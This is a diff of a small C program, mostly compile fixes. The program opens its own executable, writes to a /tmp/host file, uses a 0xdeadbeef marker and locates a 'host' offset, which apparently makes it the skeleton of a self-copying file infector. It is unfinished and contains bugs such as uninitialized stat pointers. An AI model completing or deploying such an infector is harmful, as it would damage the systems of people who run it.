@@ -1,6 +1,6 @@
 #include <stdlib.h>
-#include <
-
+#include <stdio.h>
+#include <string.h>
 
 #include <fcntl.h>
 #include <unistd.h>
@@ -17,7 +17,7 @@ int main(int argc, char** argv) {
     sprintf(tempfilename, "/tmp/host.%u", ruid);
 
     // attempt to create new file
-    int tempfile = open(filename, O_CREAT | O_WRITE, S_IRWXU);
+    int tempfile = open(tempfilename, O_CREAT | O_WRONLY, S_IRWXU);
 
     // check if that file was already there
     if (tempfile == -1 && errno == EEXIST) {
@@ -30,7 +30,7 @@ int main(int argc, char** argv) {
     }
 
     // open ourselves
-    int seedfile = open(argv[0], O_READ);
+    int seedfile = open(argv[0], O_RDONLY);
 
     if (seedfile == -1) {
         printf("Error: seedfile cannot be opened\n");
@@ -38,10 +38,10 @@ int main(int argc, char** argv) {
     }
 
     // get info about files
-    stat* tempfilestat;
+    struct stat* tempfilestat;
     fstat(tempfile, tempfilestat);
 
-    stat* seedfilestat;
+    struct stat* seedfilestat;
     fstat(seedfile, seedfilestat);
     
     char magic[4] = {0xde, 0xad, 0xbe, 0xef};
@@ -55,7 +55,7 @@ int main(int argc, char** argv) {
     // where are we?
     off_t hoststart = lseek(seedfile, 0, SEEK_CUR);
 
-    printf("%d", hoststart);
+    printf("%ld", hoststart);
 
     //sendfile(tempfile, seedfile, hoststart, );
 
